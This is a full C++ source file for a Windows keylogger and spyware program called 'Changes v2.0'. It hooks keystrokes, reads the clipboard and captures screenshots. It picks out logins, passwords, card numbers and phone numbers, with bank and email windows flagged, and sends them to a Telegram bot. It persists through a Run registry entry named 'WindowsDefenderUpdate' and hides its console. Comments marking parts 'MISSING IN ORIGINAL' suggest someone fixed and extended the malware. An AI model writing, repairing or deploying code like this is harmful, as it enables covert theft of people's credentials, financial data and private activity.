#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <regex>
#include <sstream>
#include <shlobj.h>
#include <tlhelp32.h>
#include <map>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")

// ⚠️ SECURITY WARNING: Replace with your NEW credentials!
// Your current token is COMPROMISED - revoke it in @BotFather immediately!
const wchar_t* BOT_TOKEN = L"YOUR_NEW_BOT_TOKEN_HERE";
const wchar_t* CHAT_ID = L"YOUR_CHAT_ID_HERE";

std::wstring keyBuffer, clipBuffer;
std::vector<BYTE> screenshotBuffer;
CRITICAL_SECTION keyLock, clipLock, contextLock;
HANDLE hHttpSession = NULL;
HHOOK keyboardHook = NULL;
bool running = true;
FILETIME lastScreenshot = {0};
std::wstring activeWindowTitle;
std::map<std::wstring, std::wstring> credentialCache;

// ==================== SMART CONTEXT DETECTOR ====================
class ContextAwareDetector {
private:
    std::wstring detect_email(const std::wstring& text) {
        std::wregex email_regex(L"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})");
        std::wsmatch match;
        if (std::regex_search(text, match, email_regex)) {
            return match[1].str();
        }
        
        // Detect username patterns
        std::wregex user_regex(L"([a-zA-Z0-9._]{6,25})(?=[\\r\\n\\t ]|$)");
        if (std::regex_search(text, match, user_regex)) {
            std::wstring user = match[1].str();
            if (currentContext == L"GMAIL" || wcsstr(activeWindowTitle.c_str(), L"mail")) {
                return user + L"@gmail.com";
            } else if (currentContext == L"OUTLOOK" || wcsstr(activeWindowTitle.c_str(), L"outlook")) {
                return user + L"@outlook.com";
            }
            return user;
        }
        return L"";
    }
    
    std::wstring detect_password(const std::wstring& text) {
        std::wregex pass_regex(L"([a-zA-Z0-9!@#$%^&*._-]{8,})(?=[\\r\\n\\t ]|$)");
        std::wsmatch match;
        if (std::regex_search(text, match, pass_regex)) {
            std::wstring pass = match[1].str();
            
            // Check if it's a common password or just random typing
            if (pass.find(L"password") != std::wstring::npos || 
                pass.find(L"qwerty") != std::wstring::npos ||
                pass.find(L"123456") != std::wstring::npos) {
                std::wstring masked;
                for (size_t i = 0; i < pass.length(); ++i) masked += L'*';
                return masked + L"(" + std::to_wstring(pass.length()) + L")";
            }
        }
        return L"";
    }
    
    std::wstring detect_credit_card(const std::wstring& text) {
        std::wregex cc_regex(L"(\\d{4}[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4})");
        std::wsmatch match;
        if (std::regex_search(text, match, cc_regex)) {
            std::wstring cc = match[1].str();
            if (cc.length() >= 16) {
                return L"****-****-****-" + cc.substr(cc.length() - 4);
            }
        }
        return L"";
    }
    
    std::wstring detect_phone(const std::wstring& text) {
        std::wregex phone_regex(L"(\\+?\\d{1,3}[ -]?\\(?\\d{3}\\)?[ -]?\\d{3}[ -]?\\d{4})");
        std::wsmatch match;
        if (std::regex_search(text, match, phone_regex)) {
            return match[1].str();
        }
        return L"";
    }
    
public:
    std::wstring currentContext;
    
    void update_context() {
        HWND foreground = GetForegroundWindow();
        if (foreground) {
            wchar_t title[256];
            GetWindowTextW(foreground, title, 256);
            EnterCriticalSection(&contextLock);
            activeWindowTitle = title;
            
            std::wstring title_lower = title;
            std::transform(title_lower.begin(), title_lower.end(), title_lower.begin(), ::towlower);
            
            if (title_lower.find(L"gmail") != std::wstring::npos || 
                title_lower.find(L"google") != std::wstring::npos) {
                currentContext = L"GMAIL";
            } else if (title_lower.find(L"outlook") != std::wstring::npos || 
                       title_lower.find(L"live.com") != std::wstring::npos ||
                       title_lower.find(L"hotmail") != std::wstring::npos) {
                currentContext = L"OUTLOOK";
            } else if (title_lower.find(L"facebook") != std::wstring::npos || 
                       title_lower.find(L"login") != std::wstring::npos) {
                currentContext = L"FACEBOOK";
            } else if (title_lower.find(L"bank") != std::wstring::npos || 
                       title_lower.find(L"chase") != std::wstring::npos || 
                       title_lower.find(L"wells") != std::wstring::npos ||
                       title_lower.find(L"paypal") != std::wstring::npos) {
                currentContext = L"BANK";
            } else if (title_lower.find(L"amazon") != std::wstring::npos || 
                       title_lower.find(L"ebay") != std::wstring::npos) {
                currentContext = L"SHOPPING";
            } else {
                currentContext = L"GENERAL";
            }
            LeaveCriticalSection(&contextLock);
        }
    }
    
    std::wstring detect_sensitive_data(const std::wstring& text) {
        update_context();
        
        std::wstring email = detect_email(text);
        std::wstring pass = detect_password(text);
        std::wstring cc = detect_credit_card(text);
        std::wstring phone = detect_phone(text);
        
        std::wstring result;
        
        if (!email.empty() && !pass.empty()) {
            // Check if we already captured these credentials
            std::wstring key = email + L"_" + currentContext;
            if (credentialCache.find(key) == credentialCache.end()) {
                result = L"🔐 [" + currentContext + L" CREDENTIALS]\n";
                result += L"📧 Login: " + email + L"\n";
                result += L"🔑 Password: " + pass + L"\n";
                result += L"💻 Window: " + activeWindowTitle;
                credentialCache[key] = pass;
            }
        } else if (!email.empty()) {
            result = L"📧 [" + currentContext + L"]: " + email;
        } else if (!pass.empty()) {
            result = L"🔑 [" + currentContext + L" PASSWORD]: " + pass;
        } else if (!cc.empty()) {
            result = L"💳 [CREDIT CARD]: " + cc + L"\n💻 Window: " + activeWindowTitle;
        } else if (!phone.empty()) {
            result = L"📞 [PHONE]: " + phone + L"\n💻 Window: " + activeWindowTitle;
        }
        
        return result;
    }
    
    std::wstring get_context_summary() {
        return L"[" + currentContext + L"] " + activeWindowTitle;
    }
};

ContextAwareDetector detector;

// ==================== KEYBOARD HOOK (MISSING IN ORIGINAL) ====================
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);
            
            WCHAR buffer[16] = {0};
            int result = ToUnicode(kbdStruct->vkCode, 
                                 MapVirtualKey(kbdStruct->vkCode, MAPVK_VK_TO_VSC),
                                 keyboardState, buffer, 16, 0);
            
            if (result > 0) {
                EnterCriticalSection(&keyLock);
                keyBuffer += buffer;
                
                // Smart buffer management
                if (keyBuffer.length() > 200) {
                    keyBuffer = keyBuffer.substr(keyBuffer.length() - 100);
                }
                LeaveCriticalSection(&keyLock);
            } else {
                // Handle special keys
                EnterCriticalSection(&keyLock);
                switch (kbdStruct->vkCode) {
                    case VK_SPACE: keyBuffer += L" "; break;
                    case VK_RETURN: keyBuffer += L"\n"; break;
                    case VK_TAB: keyBuffer += L"\t"; break;
                    case VK_BACK: 
                        if (!keyBuffer.empty()) keyBuffer.pop_back();
                        break;
                    case VK_ESCAPE: keyBuffer += L"[ESC]"; break;
                    case VK_DELETE: keyBuffer += L"[DEL]"; break;
                }
                LeaveCriticalSection(&keyLock);
            }
            
            // Update context on any key press
            detector.update_context();
        }
    }
    
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

bool install_keyboard_hook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 
                                   GetModuleHandle(NULL), 0);
    return keyboardHook != NULL;
}

// ==================== TELEGRAM FUNCTIONS ====================
std::string url_encode(const std::string& input) {
    std::string result;
    for (unsigned char c : input) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            result += c;
        } else if (c == ' ') {
            result += '+';
        } else {
            char buf[4];
            sprintf_s(buf, "%%%02X", c);
            result += buf;
        }
    }
    return result;
}

std::string wstring_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &strTo[0], size_needed, NULL, NULL);
    strTo.pop_back(); // Remove null terminator
    return strTo;
}

bool init_winhttp() {
    hHttpSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                              WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    return hHttpSession != NULL;
}

void send_telegram(const std::wstring& message) {
    if (!hHttpSession || message.empty()) return;
    
    std::string utf8_msg = wstring_to_utf8(message);
    if (utf8_msg.size() > 3900) {
        utf8_msg = utf8_msg.substr(0, 3900) + "...";
    }
    
    std::string encoded_msg = url_encode(utf8_msg);
    std::string path = "/bot" + wstring_to_utf8(std::wstring(BOT_TOKEN)) +
                      "/sendMessage?chat_id=" + wstring_to_utf8(std::wstring(CHAT_ID)) +
                      "&text=" + encoded_msg;
    std::wstring wpath(path.begin(), path.end());
    
    HINTERNET hConnect = WinHttpConnect(hHttpSession, L"api.telegram.org", 
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return;
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(), NULL,
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           WINHTTP_FLAG_SECURE);
    if (hRequest) {
        WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        WinHttpReceiveResponse(hRequest, NULL);
        
        // Quick error check
        DWORD status = 0;
        DWORD size = sizeof(status);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                           NULL, &status, &size, NULL);
        
        WinHttpCloseHandle(hRequest);
    }
    WinHttpCloseHandle(hConnect);
    Sleep(200); // Rate limiting
}

void process_keys() {
    if (!TryEnterCriticalSection(&keyLock)) return;
    if (keyBuffer.empty()) {
        LeaveCriticalSection(&keyLock);
        return;
    }
    
    std::wstring data = keyBuffer;
    keyBuffer.clear();
    LeaveCriticalSection(&keyLock);
    
    // Smart detection
    std::wstring sensitive = detector.detect_sensitive_data(data);
    if (!sensitive.empty()) {
        send_telegram(sensitive);
    } else if (data.length() > 15) {
        // Send regular keystrokes with context
        std::wstring summary = detector.get_context_summary();
        std::wstring message = summary + L"\n📝: " + data.substr(0, 150);
        if (data.length() > 150) message += L"...";
        send_telegram(message);
    }
}

// ==================== CLIPBOARD MONITOR ====================
std::wstring get_clipboard() {
    if (!IsClipboardFormatAvailable(CF_UNICODETEXT) || !OpenClipboard(NULL)) 
        return L"";
    
    HGLOBAL hglb = GetClipboardData(CF_UNICODETEXT);
    if (hglb) {
        wchar_t* clipText = (wchar_t*)GlobalLock(hglb);
        std::wstring result(clipText ? clipText : L"");
        GlobalUnlock(hglb);
        CloseClipboard();
        return result;
    }
    CloseClipboard();
    return L"";
}

void clipboard_monitor() {
    std::wstring lastClip;
    while (running) {
        std::wstring clip = get_clipboard();
        if (!clip.empty() && clip != lastClip && clip.length() > 3) {
            // Smart clipboard analysis
            std::wstring sensitive = detector.detect_sensitive_data(clip);
            if (!sensitive.empty()) {
                send_telegram(L"📋 [CLIPBOARD - SENSITIVE]\n" + sensitive);
            } else if (clip.length() > 20 && clip.length() < 500) {
                // Only send non-trivial clipboard content
                std::wstring context = detector.get_context_summary();
                send_telegram(L"📋 [CLIPBOARD] " + context + L"\n" + 
                             clip.substr(0, 100) + 
                             (clip.length() > 100 ? L"..." : L""));
            }
            lastClip = clip;
        }
        Sleep(1800);
    }
}

// ==================== SCREENSHOT FUNCTIONS ====================
void capture_screenshot() {
    // Reduced size for faster transmission
    int width = GetSystemMetrics(SM_CXSCREEN) / 3;
    int height = GetSystemMetrics(SM_CYSCREEN) / 3;
    
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hbm);
    
    // Use StretchBlt for resizing
    SetStretchBltMode(hdcMem, HALFTONE);
    StretchBlt(hdcMem, 0, 0, width, height, 
               hdcScreen, 0, 0, 
               GetSystemMetrics(SM_CXSCREEN), 
               GetSystemMetrics(SM_CYSCREEN), 
               SRCCOPY);
    
    // Prepare bitmap data
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = height;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    
    DWORD dwBmpSize = ((width * 24 + 31) / 32) * 4 * height;
    screenshotBuffer.resize(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize);
    
    // Get bitmap bits
    GetDIBits(hdcMem, hbm, 0, height, 
              screenshotBuffer.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER),
              (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    // Add headers
    BITMAPFILEHEADER bf = {0};
    bf.bfType = 0x4D42;
    bf.bfSize = screenshotBuffer.size();
    bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    memcpy(screenshotBuffer.data(), &bf, sizeof(BITMAPFILEHEADER));
    memcpy(screenshotBuffer.data() + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
    
    // Cleanup
    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void send_screenshot() {
    if (screenshotBuffer.empty()) return;
    
    HINTERNET hConnect = WinHttpConnect(hHttpSession, L"api.telegram.org",
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return;
    
    std::string path = "/bot" + wstring_to_utf8(std::wstring(BOT_TOKEN)) +
                      "/sendPhoto?chat_id=" + wstring_to_utf8(std::wstring(CHAT_ID));
    std::wstring wpath(path.begin(), path.end());
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath.c_str(), NULL,
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           WINHTTP_FLAG_SECURE);
    if (hRequest) {
        std::string boundary = "----ChangesBoundary" + std::to_string(GetTickCount());
        std::wstring w_content_type = L"Content-Type: multipart/form-data; boundary=";
        w_content_type += std::wstring(boundary.begin(), boundary.end());
        
        std::string body = "--" + boundary + "\r\n" +
                          "Content-Disposition: form-data; name=\"photo\"; filename=\"screen.bmp\"\r\n" +
                          "Content-Type: image/bmp\r\n\r\n";
        body.append(screenshotBuffer.begin(), screenshotBuffer.end());
        body += "\r\n--" + boundary + "--\r\n";
        
        if (WinHttpSendRequest(hRequest, w_content_type.c_str(), -1L,
                              (LPVOID)body.data(), (DWORD)body.length(), 
                              (DWORD)body.length(), 0)) {
            WinHttpReceiveResponse(hRequest, NULL);
        }
        WinHttpCloseHandle(hRequest);
    }
    WinHttpCloseHandle(hConnect);
    screenshotBuffer.clear();
}

// ==================== PERSISTENCE & STEALTH ====================
void persistence() {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,
                               L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                               0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        // Use a less suspicious name
        RegSetValueExW(hKey, L"WindowsDefenderUpdate", 0, REG_SZ,
                      (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

void stealth_init() {
    FreeConsole();
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
    
    // Hide from task manager (basic)
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);
}

// ==================== MAIN FUNCTION ====================
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    DisableThreadLibraryCalls(GetModuleHandle(NULL));
    CoInitialize(NULL);
    
    InitializeCriticalSection(&keyLock);
    InitializeCriticalSection(&clipLock);
    InitializeCriticalSection(&contextLock);
    
    stealth_init();
    persistence();
    
    if (init_winhttp()) {
        send_telegram(L"🚀 [Changes v2.0] ACTIVATED\n🕵️ Smart Context-Aware Keylogger\n📧 Email/Bank/Credit Card Detection");
        
        // Install keyboard hook (MISSING IN ORIGINAL!)
        if (!install_keyboard_hook()) {
            send_telegram(L"❌ Failed to install keyboard hook");
            return 1;
        }
        
        std::thread clipboard_thread(clipboard_monitor);
        clipboard_thread.detach();
        
        SYSTEMTIME st;
        DWORD lastKeyProcess = GetTickCount();
        
        // Message loop required for low-level keyboard hooks
        MSG msg;
        PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE);
        
        while (running) {
            // Process Windows messages (required for hooks)
            if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            
            // Process keystrokes periodically
            if (GetTickCount() - lastKeyProcess > 5000) { // Every 5 seconds
                process_keys();
                lastKeyProcess = GetTickCount();
            }
            
            // Check clipboard buffer
            if (TryEnterCriticalSection(&clipLock)) {
                if (!clipBuffer.empty()) {
                    send_telegram(clipBuffer);
                    clipBuffer.clear();
                }
                LeaveCriticalSection(&clipLock);
            }
            
            // Screenshot every 60 seconds
            GetSystemTime(&st);
            FILETIME now;
            SystemTimeToFileTime(&st, &now);
            ULARGE_INTEGER nowUL = {now.dwLowDateTime, now.dwHighDateTime};
            ULARGE_INTEGER lastUL = {lastScreenshot.dwLowDateTime, lastScreenshot.dwHighDateTime};
            
            if ((nowUL.QuadPart - lastUL.QuadPart) > 600000000LL) { // ~60 seconds
                capture_screenshot();
                send_screenshot();
                send_telegram(L"📸 [SCREENSHOT] " + activeWindowTitle);
                lastScreenshot = now;
            }
            
            Sleep(100);
        }
        
        if (keyboardHook) {
            UnhookWindowsHookEx(keyboardHook);
        }
    }
    
    running = false;
    Sleep(1000);
    DeleteCriticalSection(&clipLock);
    DeleteCriticalSection(&keyLock);
    DeleteCriticalSection(&contextLock);
    if (hHttpSession) WinHttpCloseHandle(hHttpSession);
    CoUninitialize();
    return 0;
}
